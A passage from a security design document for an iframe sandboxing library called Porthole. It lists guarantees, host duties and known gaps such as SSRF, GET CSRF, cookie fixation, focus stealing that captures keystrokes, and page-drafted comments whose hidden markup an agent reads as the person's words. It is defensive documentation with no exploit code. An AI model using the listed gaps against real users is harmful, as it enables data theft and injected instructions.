  - an `Origin` or `Referer` naming the content origin is rewritten to the app's; any other goes
    as sent, so an app that checks `Origin` sees a foreign one.

**The host must**

- Preview only code it trusts: the app gets no shell and no egress control (P020).
- Refuse, in its `instance` callback, upstream addresses it doesn't mean (loopback, private
  networks): Porthole takes any http(s) URL, and the client's proposal is untrusted (SSRF).
- In a relay of its own, rewrite the headers as `proxyTo` does
  (`upstreamHeaders.request(headers, { origin, target })`). A WebSocket relay that takes the
  access from `content.access(request)` gets the browser's whole `Cookie` header, Porthole's
  cookies included: send the app the headers `upstreamHeaders.request(…, { websocket: true })`
  makes (Porthole's cookies removed, the upgrade's own headers kept).
- Keep previews off pages with displays that read data (S7).
- Expect a served (domain) display's `blocked` from two sources only (P125): its door, or, before
  any frame, your own issue endpoint's refusal (`sign-in`, `denied`, `not-found`). Neither is the
  previewed app's word; a url-mode app's frame status still is (above), so never put a preview's
  outcome in the same place in your UI as a served display's.

**Not guaranteed**

- The app's network is its own.
- The app's word about how it loaded is its own: it shares its origin with Porthole's entry page
  and status pages and has no shell to speak first, so it can make the display's `outcome` any
  `blocked`, with any code, and the host show its fallback ("open this in a new tab to sign in")
  with a link out of the page (P124). A host that previews code it doesn't trust words that
  fallback as its own, not as Porthole's or the person's sign-in.
- A page on another origin can still open the app by a navigation (a link, a frame of its own),
  which reaches the app's GET routes as any link does.
- A request with neither `Origin` nor `Sec-Fetch-Site` goes on: in browsers without fetch
  metadata (Safari before 16.4, older Chromium and Firefox) a sibling's GET subresource carries
  the app's cookie (GET CSRF, script-shaped responses); POSTs are still refused, by `Origin`. The
  app's own script can set a non-`HttpOnly` `__Host-porthole-<key>` where none exists: fixation
  with a session it holds (P101).
- Through `proxyTo`, `True-Client-IP` and `CF-Connecting-IP` reach the app as the client sent
  them.
- The app is a sibling of every other content origin, with no CSP of Porthole's beyond
  `frame-ancestors`: S3's cookie problems are easier from here.

### S7. Several displays on one page

**The rule: a page's egress is the union of its frames' egress.** Any frame can `postMessage`
any other frame on its page, and nothing inside a frame can stop it. So what one display was given
can be handed to the display with the widest network.

| Beside a display that reads the host's data or holds what the person types | |
| --- | --- |
| Closed egress, or Porthole's libraries | Fine. |
| `LIBRARY_CDNS` | Fine for ordinary data. Every request path to its nine origins is a narrow channel read by their operators: not for highly sensitive data. |
| An MCP view with `connectDomains` | Its domains become the page's. |
| `anyHttps` | No: any image URL is a way out. |
| url mode | No: the app's network is its own. |

- Porthole doesn't enforce this: `defineDisplays` takes any kinds together, and
  `frameSources` is the union of all of theirs. Group displays by page yourself.
- An opaque frame also inherits the page's own CSP, so a strict page narrows its opaque frames
  further (P058). A served frame has only its own policy.

**What sharing a scope costs, which Porthole does not stop** (the premise is a scope its author
controls — one person's artifact and its versions, one session's widgets — not a scope shared across
people who distrust each other). A scope's displays that aren't nested share one origin and run
content there with `allow-same-origin`, so one reaches another's document (`top[i]`) and its storage.
P125 stops a sibling speaking Porthole's word for another display (its door says how loading went,
unreachably), but a sibling of the scope can still, against another display of it:

- spend its three restarts (`MAX_RESTARTS`) by reloading it, then stop it, so its outcome is a
  `timeout` ("This is taking too long", no link) the person may read as the display's own;
- deface it — rewrite its document — since they share an origin;
- read a sandbox-proxy view's HTML once the host has sent it into the view.

These are the costs of putting displays an author controls in one scope. To deny them, put displays
that distrust each other in **different scopes** (different origins), or nest them (`nested: true`),
whose shell and page a sibling can't reach (P114). What a sibling cannot do is forge Porthole's own
fallback (a sign-in prompt with a link out): that is the door's wall (P125).

## 7. The display layer and the app runtime

### The display layer

What it is: the presets, the isolation, the egress walls, the shell, the bridge for the display's
host functions (`sendPrompt`, `openLink`, `downloadFile`, `copyText`, `callTool`, `readData`,
`subscribeData`, `setModelContext`, `reportError`, annotations) and the generated manual.

**Porthole guarantees** the two lines of [§4](#4-two-lines-of-defense) for each display except url
mode (S6), with S1–S5's open items: isolation, closed egress, the gates. One config generates the
CSP, the sandbox, the shell's wiring and the manual, and a test holds them in agreement
(`test/agreement.test.ts`), so the agent is told what the sandbox allows. The leak suite tests each
wall on three engines, and `defineHostConformance` runs it against a host's own page.

**The host must** do what [every host](#what-every-host-must-do) does, write the handlers (their
effects are its own), and group displays by page (S7).

**The host's fallback** (P040, P124). A display's `outcome` says how its frame loaded, and a host
draws its own UI on a `blocked` one, in Porthole's wording (`frameFallback`: "Open this in a new
tab to sign in", "You can't open this anymore") with a link out of the page: UI the person takes
for the host's and Porthole's, which content must not be able to summon. A `blocked` comes from a
frame status (`porthole/notifications/frame-status`), and nothing in that message says who sent
it: Porthole's status pages are documents of the frame's own window and origin, as content is. So
the host takes one only where content can't have said it. **A served display that isn't nested** (a
served shell, a page, a view through the sandbox proxy) is framed on its scope's origin, where the
scope's others run content with `allow-same-origin`: one of them reaches a new document there before
its first script runs and could speak for it, so **no frame status from its own frame is ever
taken** (each run, the first is dropped with one `frame-status` host error), and its silence is a
`timeout`, never a fallback. Its word comes from its **door** instead (P125): a page of Porthole's
on the same origin, in a hidden opaque frame of the host's own (`sandbox="allow-scripts"`, no name,
`inert`, 0×0) that no content shares an origin with and no sandboxed sibling can navigate, taken
before the content frame is made — `open`, or `blocked` and why. A **nested page's shell** (on a
label of its own, P114) keeps the ordering rule (its runtime's word opens every document that holds
content). An **opaque frame**'s every status is the content's; a **url-mode app**'s is taken (S6).

This closes the audit of 2026-10-30 (P124-1): before P125, a served display that isn't nested could
be spoken for by a same-scope sibling — the sibling reached a new document of its scope (`top[i]`,
same origin before the shell ran), posted a frame status taken as the run's first word, or stopped
or rewrote it so its silence read as `framing`, or reloaded a running one into a new run it spoke
first in. The door closes every route: the sibling can't read, navigate or speak from it (it is
opaque, unnamed, host-sandboxed), and the content frame's own word and silence are no longer taken.
P124-2 is closed too: a file set's entry must be a page (`.html`/`.htm`; `checkFileSet`,
`admitFiles`, `lintFiles` refuse another), and a set stored before that rule answers Porthole's
`not-found` status page — the door says `not-found`, never an inert file that says nothing.

The known costs that remain are the costs of sharing a scope (S7). A served non-nested location
without a door (a server older than the host, a locator that drops it, a clean address framed as it
is) is refused before any frame: `blocked: locate` and a `door` host error (P125). A clean address
is for a tab: in a frame the content origin answers it with a page that has no script and goes
nowhere, never the app's authorize or sign-in. To show what a clean address names in a frame, the
host resolves it through its issue endpoint first, and a refusal there (signed out, denied, not
found) is the display's outcome with no frame built. P125 also records why no timing rule can stand
in for that: a `load` event is not a committed document (DECISIONS P125).

**Annotations** (`annotate`, P053, P104, P107). The shell that draws marks and reports anchors shares
its realm with the content (a nested page's too: its marks are drawn by the runtime in the page's
own frame, below the shell, P111), so:

- *What content learns.* Everything the host sends in a `show` is posted into the frame's window,
  where the content can listen: each mark's id, anchor and, where given, `count` (the number on
  its marker). A host gives ids that say nothing (never a person's name or a comment's words), and
  a count only where the page may know how many there are. Who commented and what they wrote stay
  in the host's own UI, outside the frame, and so does what the person types there, within the
  keyboard's limits below (P109).
- *Drafts* (P107). A mark with `kind: "draft"` (a comment its author hasn't posted) is drawn apart,
  a dashed line and a hollow marker with no number, so the page also learns which of its marks are
  drafts: that the person viewing it is writing a comment there, before they post it. That is new
  information for the page, accepted where the page has no way out: drafts are the host's to send
  only to their author's own frame (Porthole can't tell whose frame it is), the page is the one
  being commented on and already sees where the person selects (`selected`), and closed egress
  ([§4](#4-two-lines-of-defense)) keeps it off the network. Closed egress doesn't cover the
  channels the host itself opens, and through them a draft's existence, place and timing can
  leave: a page with the runtime's `db` (writes) and `user` can call `user.get()`, read the marks
  shown to it, and write "viewer A is drafting at section 3" where its author and other viewers
  read it before A posts; once A posts, the page can tie that posted comment to A (the anchor and
  the time match). Origins a config declares for egress (an MCP App's `connectDomains`, S5; an
  `egress` a host opened in its own config; the `liveWidget` preset itself has none, P103), and a
  host function that sends the page's words somewhere, are channels of the same kind (S4, and the
  app runtime below). A host that sends drafts to such a page accepts that its author and other viewers can
  learn of them. A draft carries nothing else: the host drops its count before the frame (control
  `draft-count`), so a page can't read how many drafts are at an anchor unless the host sends a
  mark per draft, and its id is the host's, as any mark's (random, never the draft's words); the
  draft's words are typed into the host's composer, which the page can try to take the keyboard
  from ("The keyboard" below). A host
  that sends drafts into a frame others see (a shared screen, a frame several viewers share) tells
  that page, and anything it draws for them, what its author hasn't posted.
- *What content can fake.* Any report: a selection while the host asks for one, where marks are,
  and a marker's click (`activated`) for any mark the host shows with a marker (a count, or a draft:
  P107), without a click on it and with any box. It can draw look-alike markers, or lay its own elements over Porthole's.
  The host takes each report only for what it asked for and its own shown ids, rebuilt within
  `ANNOTATION_LIMITS`, at 120 a minute; `activated` for a mark without a marker, or an id it
  doesn't show, is dropped (negative control `annotation-activated`). `activated` is also taken
  only while the host's page has transient user activation, which a real marker click or tap gives
  it (P105, measured on all three engines; control `annotation-activated-gesture`). That stops a
  page opening the host's view with no gesture at all, nothing more: activation lasts 5 s after any
  gesture anywhere on the page (a click on the host's own UI, typing in the content, the click that
  opened the display), and a fake posted then, on a timer or a scroll, is taken; one posted on the
  person's own press in the content lands under their pointer. The guard on the host's view (§6) is
  the defence, not this. Where the platform can't tell (a custom one whose `userActivation()`
  answers undefined), the report passes, as the gesture gate does.
- *Labels.* An anchor's `label` is the page's text: the words selected, or an element's own words,
  else its `alt`, `aria-label` or `title`, which the person never sees on the page. The host takes
  out of every label everything a person can't see (every format character, bidi controls and
  zero-width ones among them, every default-ignorable code point, variation selector, tag,
  private-use character and control: P105, with none of P100's exceptions for emoji and shaped
  letters, whose surroundings a page can fake), so what it shows is what it has. A text
  anchor's quote (`exact`) keeps them, to be found again: a host that hands a quote or a label to
  a model hands it the page's words, to be read as that, never as instructions.
- *Boxes.* Every box a report carries (`selected`, `activated`, `anchored`) is the page's word.
  Porthole clamps each to the frame's viewport as it is when the report arrives, before the host
  hears it: the part inside is kept, and a box wholly outside becomes one of no size on the
  nearest edge (control `annotation-rect-clamp`). So a page can't make the host place its own UI
  over the rest of the app. It still chooses any point inside its own frame: a box is a
  positioning hint, never a fact about the content. The box is in the frame's own CSS px, its
  layout size: a host that scales or transforms the frame (a thumbnail, a zoomed preview) maps the
  box through that transform before placing anything by it. A platform's `viewport()` that answers
  no size, or throws, clamps every box to nothing at the frame's corner (P105). The frame's size is
  read for every report the host takes, before the report's rate: a forced layout of the host's
  page per message, which a repeated `ui/initialize` already causes (accepted, P105).
- *What holds, against content that patches none of the DOM's or JavaScript's built-ins.* A real
  press or click on a marker reaches none of the content's handlers (the shell's first listener
  stops it; control `marker-click`) and moves neither focus nor a selection (control
  `marker-prevent`), so content can't act on it or cancel it; nor can it read or reach inside the
  shell's layer (a closed shadow root). Content can still tell that a marker was pressed, and
  roughly where: the pointer leaving its own element names the layer, the layer matches `:hover`
  and `:active`, and the frame gets user activation. On touch (P119), a marker is also the
  44 by 44 px box around its bubble, drawn in that same layer: a tap there is a press on the
  marker, with the same checks (a trusted click, the main button, on the layer), so the content
  loses a tap within 13 px of a bubble (a few px of its words above and below it), as it loses
  one on the bubble. Which pointer is used is read from trusted pointer events only; a page that
  makes its own up changes nothing, and a real `activated` still needs a real click.
- *What doesn't hold against content that does.* The shell shares the content's realm. It reads
  and stops a marker's press through the platform's own functions and getters, kept before
  content runs (P105, control `marker-originals`), so patching `Event`'s or `MouseEvent`'s
  prototypes no longer lets content hear a press or make the shell misread one. But the layer's
  nodes pass through built-ins content can replace (the shell's insertion guards call
  `Element.prototype.matches` on them), so content can reach the closed shadow root that way,
  read the markers and rewrite them (the review of P104, on all three engines). Nothing in the
  layer is secret: it holds only what `show` sent, which the content can read anyway.
- *Clearing the selection* (P115). `annotations.clearSelection()` is the host's word to the frame
  (`porthole/annotate.clearSelection`), with nothing back: the shell takes the page's selection
  away through `Selection.prototype.removeAllRanges` as it was before content ran (control
  `clear-selection`: a page that replaced it keeps its selection otherwise) and forgets the one it
  told, so the clear makes no `unselected` or `selected`. It goes host to frame only: the host
  takes no such message from a frame, and the shell takes it only from its frame's parent (a page
  that posts it to its own window is dropped). It gives the page no power it lacks: a page can
  clear or select its own text at any time, and can select the words again right after a clear
  (the host hears that as any selection, while it asked for text). But the page sees the clear
  (the message, and a `selectionchange` with no press of its own) and so learns when the person
  was done with its selection (P121, after the audit of P115). A host that clears only when a
  draft is added tells the page that a draft exists on its words, and when: clear when the
  composer opens, or on every close, kept or dismissed, or leave it to the person's next click,
  never only on a draft, above all for a page `mayPassOn` says to keep drafts from (ADOPTING.md
  § Annotations).
- *What content can always do.* Hide, shrink, move or cover the layer (its scripts can rewrite the
  layer's style, lay elements over it, or transform the page it sits in), change its words so a
  mark is orphaned, or flood the shared rate so real reports are refused. It can also make the
  shell's own work dear by its layout: finding marks again and placing markers after a change of
  the content runs in the frame, once per quiet run of changes, and each marker in view is placed
  by a bounded number of hit tests (measured with 300 marks with counts in view: about 20 ms a
  change; 200 in a 3,000-line block: 25 to 50 ms; P105). In an opaque frame that shares the host's
  process, that time is the host's too ([§5](#5-out-of-scope)). An honest page's
  follow-up reports, of the marks (while one has a marker) and of the person's selection after a
  scroll, share one clock: at most one a second together, each only when its box moved (P105).
- So `activated` opens the host's own view of a mark it already shows, placed within the frame's
  box (better: beside it), guarded as §6 says, and never acts on it (no post, submit, discard,
  resolve, delete or reply); an anchor or a rect decides where something is drawn, never who may
  see or do anything.

**The keyboard** (P109). Any display, of any kind and any version, can move the keyboard into its
frame: `element.focus()` runs in the content's realm, where nothing of Porthole can stop it, and on
Chromium and WebKit it needs no gesture. What the person goes on typing then goes to the page,
which can keep it (`db`) or send it out through any egress it has. The page knows when it matters:
its shell reports `selected` when the host opens a composer on it, and draft marks (P107) say
where the person is writing. P107 and P108 didn't make this possible; they put the person's
unposted words beside the frame and tell the page when.

- *What holds* (the web platform's focus guard, in every `createHost` display): when focus leaves
  one of the host page's text fields (a text area, an `<input>` that takes text, an editable region,
  in open shadow roots too) for a display's frame, and the person didn't move it there, focus goes
  back to the field once the engine has finished the move, the guard watches that it stays there
  (a page that takes it again on its own blur, which the take-back fires, is caught, as is focus
  left on nothing), and the display hears `focusTaken`. Three such moves within 10 s that came while
  the person typed or that kept focus from staying back, or five within 2 s, stop the display. The
  person moved it if they pressed Tab just before; pressed the frame (on Chromium and WebKit the
  frame element is `:active` as focus moves; on Firefox, which doesn't blur the window or show the
  press, the pointer came over the frame after the field got focus and after the person last
  typed); made a gesture the host's own events don't explain (the page has activation, but no
  key, press or click of its own for longer than activation lasts, and the field has had focus that
  long: a press or an assistive technology's activation in a frame); or the host moved it
  (`display.focus()`).
  Measured on all three engines: a page calling `focus()` every 700 ms down to a busy loop, or
  taking focus back on its own blur, while the person types a sentence gets no key of it on
  Chromium and WebKit and at most one on Firefox before it is stopped or gives up (negative
  controls `focus-guard`, and `focus-guard-watch` on Firefox); a press on the page's own field, a
  Tab into the frame, and an activation in the frame that sends the host no event keep the
  keyboard there. `comments.open` needs that focus in the calling frame, moved there by the
  person, and not just after a press on the host's page (the app runtime, below).
- *What doesn't*: a page gets the keys typed before focus is back (on Firefox, the keys of an
  animation frame: one in a sentence, measured on a slowed machine too; a few more can be lost to
  nothing while a take-back is fought, and the composer then has focus again); on Firefox a host's plain
  `focus()` doesn't move focus from a frame that holds it with the person's gesture and takes it
  back on its blur (no focus event: the keys go to the frame), so a composer that opens focused
  must use `focusField`; on Firefox a page keeps the keyboard if the pointer came over its frame after
  the person last typed and after the field got focus (a person who typed, moved the pointer over
  the frame, and types on without clicking); moves between two frames, or from what isn't a text
  field, aren't judged (a frame beside another: S7); and a platform of the host's own has no guard
  unless it implements one. The guard can take a person's own move for the page's (a press on
  Firefox with the pointer resting over the frame since before the field got focus; an assistive
  technology's activation within 5 s of their key or press on the page): focus goes back, and
  their next press once the pointer has left the frame and come back, a Tab, or an activation 5 s
  later keeps it.
- *Full Chromium* (P111, measured on Chromium 153, not the headless shell): a cross-site frame is
  out of process, and the host's page sees nothing of a press in it (no `:active`, no `:hover`, no
  pointer event past the frame's edge). For a served page that isn't nested, a person's real click
  into its field is taken back every time there (the display stopped at the third), and
  `comments.open` from a real click is refused within 5 s of any input on the host's page
  (porthole#53). Nest it.
- *A nested page* (P111, P120, P122): the guard asks the page's shell, a realm the page can't
  reach above its frame, whose transient activation turns on only from a press or key in the page
  (activation goes up, never down). A move into the frame is the person's if the shell's
  activation turned on within the last second and the host's page had no trusted press or key
  since; or a Tab, the host's own move, or a press the engine shows on the frame element. Nothing
  else counts as a press: no pointer over the frame, no host-wide activation. A move the shell
  hasn't spoken of yet waits for its word at most 500 ms (the host asks it to look at once,
  `porthole/shell/look`), then is taken back. A key the person types into the page turns its
  activation on as a press does, so (P120, after the audit of P111's guard, NG-1): where the
  host's page sees the pointer over its frames (Firefox; Chromium and WebKit where the frame is in
  their process, once the pointer has been over one), an activation while the pointer isn't over
  the frame, within a second of the person typing on the host's page, is no press; and in a fight
  over a text field (a take-back, or the person leaving a frame that took focus itself), a frame
  that takes focus again is judged as any frame is, its shell not asked: taken back at once and
  counted, and an activation it reports then is no one's gesture until it lapses, for
  `comments.open` too. Measured on full Chromium, the headless shell, WebKit and Firefox
  (`leak/served/nested.spec.ts`): a real click into the page's field keeps the keyboard; the
  page's `focus()` as it loads, on a timer while the person types, right after a click on the
  host's own button, 1.2 to 4.5 s after the person paused typing, and 700 ms after they pressed it
  and went back to the composer is taken back; a page that holds the keyboard from its load, or
  takes it while the person types, and takes it back on its own blur gets at most two keys of a
  sentence on Firefox and is stopped (none on Chromium, where a page can't take focus back on its
  blur), and its `comments.open` on a key it got reaches no handler on Firefox and full Chromium
  (on Chromium with frames in process it can: below); what a page says in the shell's name, to its
  parent or to the host's window, moves nothing (negative controls `shell-namespace`,
  `shell-host-input`, `pointer-rule`, `nested-fight`). *What doesn't*: a press in the page within
  5 s of the last one turns no activation on, so a second move into it after the person went back
  to the host's page is taken back until 5 s after their last press or key in the page, or they
  Tab in; the page gets the keys typed while a move waits for the shell's word, or before focus is
  back. No press of the person's comes within 250 ms of a key they typed on the host's page (a
  hand goes from the keys to the pointer first): a move into the frame, or the shell's activation
  turning on, that soon is their next key landing in the page, and is taken back, on every engine
  (P122, after CI saw full Chromium let such a page keep the keyboard: its key outran the shell's
  answer; negative control `key-press`). So a page that takes the keyboard while the person types
  is taken back whatever the timing. *Still*: on full Chromium, where neither the host's page nor
  the shell sees the pointer over the page, a key typed more than 250 ms after the person's last
  one that reaches the page before the shell answers the host's ask (the time a message takes
  between processes) is taken for a press, and the page keeps the keyboard and its `comments.open`
  opens; and so, more often, where Chromium keeps the page's frames in the host's process (the
  headless shell; a person's Chrome without full site isolation, Chrome on Android) until the
  host's page has seen the pointer over one of the page's frames, since the page's input runs
  before the ask there (measured in P122's review on the headless shell: a person typing one key
  every 450 ms lost 34 of 36 keys to the page in 1 run of 8, and the page was not stopped). 0.13 took such a move back; a person typing slower than one key in 250 ms
  is the case left, and only a key that lands within that message's time of the page's move
  (P122); a press back into the page within 300 ms of a fight putting focus in the host's field is
  taken back on full Chromium; where the pointer is seen, an assistive technology's activation in
  the page within a second of typing on the host's page with the pointer elsewhere is taken back
  (a Tab, or one a second later, keeps it); a shell without `navigator.userActivation` leaves
  0.13's rule. A page that holds the thread it shares with its shell (WebKit; Firefox and Chromium
  where the frames share a process) from its own click handler would push the moment the shell
  sees its activation past the person's next keys on the host's page: so the shell looks and beats
  every 50 ms and says how long it went without a look, and an activation it reports after a stall
  of over 100 ms (its own, or no word heard) is no one's gesture until it lapses (P111, after its
  review; negative control `shell-stall`). The cost: in those engines a page that keeps its thread
  busy has the person's real click taken for uncertain until it is idle.

### The app runtime

What it is: `config.runtime: "1"`, for inline widgets and artifact pages. A page reaches the
host's services through `porthole.use(name)`. Without it there is no `porthole` global, and the
config can't name the runtime's own host functions. A host that only shows content can skip this
section.

**Porthole guarantees**, in the bridge, before any handler runs:

- A page reaches the built-ins its kind offers (`clipboard`, `links`, `downloads`, `comments`) and
  what it declared when published; anything else is refused (`undeclared`). The names it declares
  in `data` hold with a viewer and without one (P094). A page from before 0.7 (the
  host's `null` declaration) keeps 0.6's surface and gets none of `user`, `artifact`, `assets` and
  `db`.
- Each method has a least level (`view < interact < admin < owner`), held against the viewer's
  level from the host's `access`. A display without a viewer gets nothing above `view` and none of
  the runtime's own host functions.
- A version mounted with `intersectDeclarations(version's, current)` gets only what both
  declarations allow (P093).
- `db`: another person's `data/users/<id>` is refused at every level; `me` is the host's id for
  the viewer, and paths in answers say `data/users/me`, never that id.
- What changes the artifact for everyone needs, by default, a gesture and a confirmation:
  `artifact.publish` and `assets.delete` (a host's `methodGates` for them replace these).
- A `db.batch` runs under the gates of each of its writes, and a `db.watch` under those of `get`
  or `query`, as well as their own; a batch that needs a confirmation is confirmed once, whole
  (P094).
- Except in **bearer mode** (`AssetStore.bearer`, an opt-in that serves an asset to anyone with
  its id), assets are served only to an access for their own artifact, after the host's check. A
  code-typed asset runs as code only when an admin uploaded it where uploaded code may run, and
  only while the config still lets uploaded code run, asked at every load, in bearer mode too
  (where every artifact config must; P103); anything else is a download.
- `comments` is write-only: the page learns only whether the composer opened. It opens only from
  a gesture with the host page's focus in the calling frame (P109: a press in it or a Tab into it;
  not the person typing in the host's UI, nor a gesture in another display; negative control
  `comments-in-frame`). In a nested page (P111) it opens too while the page's shell saw the
  person's gesture within the last second, with no press or key on the host's page since: a real
  click on the page's button a moment after typing in the host's composer opens it, on full
  Chromium too (porthole#53); with no click it is refused, whatever the page says in the shell's
  name, and so is one on a key of the person's that reached the page while it fought for the
  keyboard, or, where the host's page sees the pointer, while the pointer was elsewhere (P120). A
  draft it gives (P108) is at most 2,000 characters of text a person can
  see (P109): nothing invisible (zero-width characters, bidi and tag characters, controls but a
  new line and a tab; U+200C and U+200D only between two letters or marks, where Persian and the
  Indic scripts need them, never first, last, doubled, beside a space or punctuation, or in an
  emoji sequence; a variation selector after a pictograph is fine), no line or paragraph
  separator, not blank-looking, at most 32 blanks in a row and two blank lines in a row; anything
  else is refused before the handler. A joiner between two letters that shapes nothing still
  draws as nothing (about a bit per letter boundary, measured): accepted, as P100 accepts it. The anchor's
  label and quote reach the handler without what a person can't see, and are refused if nothing
  visible is left.
- `defineRuntimeConformance` checks the host's handlers, and with `api` its own API for `db`,
  `artifact` and `assets`, with a forged context (a viewer claiming to be the owner, no rules).

**The host must**

- Treat its API as the wall: check each call again from its own session and its own stored
  declaration, never from `context.viewer` or `context.declared`.
- Run `defineRuntimeConformance` with `api` in CI, against its real API.
- Say each viewer's level in `access`, and keep public grants low (S4).
- Store a declaration per version, and mount a version with
  `intersectDeclarations(version's, current)`.
- Revoke with its per-request check (`authorize`) and `content.forget(…)`.
- Keep each person's data apart in its own stores, and refuse moved bases and versions
  (`Refused("conflict")`).
- Handle abuse on shared pages (S4).
- Show a comment's draft (P108) whole, as the person's editable plain text in its own composer,
  and post it only on the person's own Send, never on the page's word. Once posted, the comment is
  the person's: mentions in it act as theirs, which is why they must see it all first. So (P109;
  ADOPTING.md has the code):
  - An open never replaces, appends to or moves what the person has typed, or the place they
    chose: while the composer holds their words, answer `false`, or show the page's words as a
    separate suggestion that takes no focus. (The page knows they are writing anyway: its
    `selected`, and draft marks.)
  - A composer the page filled takes no focus when it opens (keys stay where the person was
    typing: what they type for the page must not land in a postable comment), and doesn't send on
    Enter until the person has focused or edited it themselves: Send is a click until then. It is
    a view the content brought (§6's guard): no press for 500 ms after it opens, Send not focused,
    beside the frame where it can.
  - It says the text is the page's ("Suggested by this page", or the page's name), drawn by the
    host outside the frame, until the person edits it, and never shows it as one of their own
    drafts: the host's own list of drafts is how a person finds theirs, not the frame's markers,
    which a page can draw too.
  - The draft's view (P107) and the composer put nothing one click away that posts, submits or
    discards.
  - Render a page-drafted comment as plain text, or show the person before Send what readers will
    see: markup a markdown renderer hides (an HTML comment, a link definition) is still read by an
    agent. Show the anchor's label and quote as isolated text (`<bdi>`, `dir="auto"`), and hand
    them to a model only as the page's words.

**Not guaranteed**

- Closed egress covers the network, not the host's services: what a page learns from `user`, or
  what a viewer types into it, it can store in `db`, where its author (and other viewers, as the
  page's rules allow) can read it.
- `db` rewrites only paths: an id the page stores inside a document's data is returned as stored.
- In bearer mode, assets are served by id alone, without the host's check.
- A draft is the page's words in the person's composer: a person who posts it without reading
  posts what the page chose, and an agent that reads the comment takes it as theirs. Porthole
  bounds what can hide in it (visible text, 2,000 characters) and when it opens (a gesture with the
  person in the calling frame, P109: before P109, any gesture on the host's page in the last 5 s,
  typing in its own composer included); reading it is the person's. A page can still open the
  composer on the person's own press in its frame, at a moment it chooses (the second click of a
  double click, a field it asked them to type into): the composer's duties above are the bound.

## 8. Fixes in flight

The decisions below come from the 2026-10-19 review, and all of them have merged. Each row says
what was wrong, what holds now, and the limit its decision accepts, if any. Later reviews' decisions
are in the status line and in DECISIONS.md: P105 (after the review of P104), P109 (after the review
of 0.12.0's drafts), P111 (a nested page, S3; in 0.14.0), P114 (a nested page's shell on a label of
its own, after porthole#56; in 0.14.1), P124 (a frame status is the word of Porthole's pages, after
the audit raft-security-audit#16; in 0.14.5: §4, §6, §7, S6), P125 (a served display that isn't
nested takes its word from a door no same-scope content can reach, after the audit of 2026-10-30
found P124 held only for a nested display or one alone in its scope; §4, §6, §7, S7).

| Decision | State | What it closes | Sections |
| --- | --- | --- | --- |
| P092 | Merged | A request with a method `fetch` refuses (`TRACE`) could end a Node process through the Node adapter; the issue endpoint read a JSON body without a byte limit; its rate limit keyed anonymous requests on headers a client sets. Now no request ends the process, a body is read to 64 KiB at most, and the key is an address the client can't set. | §5, S4 |
| P093 | Merged | `intersectDeclarations` compared rules name by name, so a current wildcard didn't narrow a version's named rule, and a collection named `__proto__` was lost. Now the result allows exactly what both sides allow. | §7 |
| P094 | Merged | Without a viewer, a page's declared `data` names weren't held; a pushed result answered a read past `readData`'s gates; `db.batch` and `db.watch` skipped their inner methods' `methodGates`. Now each holds. | §4, S2, S4, §7 |
| P095 | Merged | What content sent was read before its gate: a log or error report was serialized whole first; waiting confirmations had no cap. Now the bridge reads it after the gate into bounded text, nothing a page sends throws out of an adapter, and at most 10 confirmations wait per display. | §5, S1, S5 |
| P096 | Merged | The negative-control runner counts a control that didn't run as passed, and CI runs the runtime's controls only. | §4 |
| P097 | Merged | A release waits for the same commit's CI. No guarantee here depends on it. | |
| P098 | Merged | A set's page whose notice came late was taken for a navigation away (red on Chromium since 0.6.0), and tests that waited a fixed time. Accepted: a files display may hold a frame that did navigate away for up to 2 s before starting it again, delivering nothing while it waits. | S1 |
| P099 | Merged | A served page in a tab had no sandbox: `window.open` sent input out, it could navigate its opener, open a picture-in-picture window, and ask for the camera, location or full screen. Now its headers carry its frame's sandbox and deny what its frame's `allow` doesn't grant, and the shell closes those on a tab too; the served suite probes self-navigation in frames and tabs. A browser without the Navigation API is an accepted limit. | S4 |
| P100 | Merged | `setModelContext` was rate-limited only, unseen by the person. Now it needs the host's `show` by default. Accepted: shown isn't read, and characters that draw as blanks pass, bounded by the length. | S1, S5 |
| P101 | Merged | Under https Porthole read unprefixed `porthole-*` cookies a sibling label can plant; the entered mark carried no label; url mode checked neither `Origin` nor `Sec-Fetch-Site`. Now only `__Host-` names are read, the mark names its label, and a url-mode app answers its own origin and navigations. | S3, S6 |
| P102 | Merged | This document. | |
| P103 | Merged | A live widget's capabilities could add origins; bearer-mode assets skipped the code re-check; `callTool` had no rate. Now the preset refuses them and its config is frozen, every load asks the current config (its ETag says which answer), and `callTool` has 30 a minute. | S2, S5, §7 |

Open with no decision yet; until then they are the host's to cover:

- a check, at mount or in development, that the page sends its `frame-src` (S1: run
  `defineHostConformance`);
- a check of which displays share a page (S7: group them yourself);
- an interstitial, report and takedown hooks for public pages, and a `lintContent` rule for
  secrets (S4);
- refusing weak or example secrets, and a health answer that isn't derived from the secret (S3);
- dropping `True-Client-IP` and `CF-Connecting-IP`, and an SSRF example for `instance` (S6);
- a warning when the content domain isn't on the PSL (S3);
- a watchdog that unloads a frame that stops answering ([§5](#5-out-of-scope)).
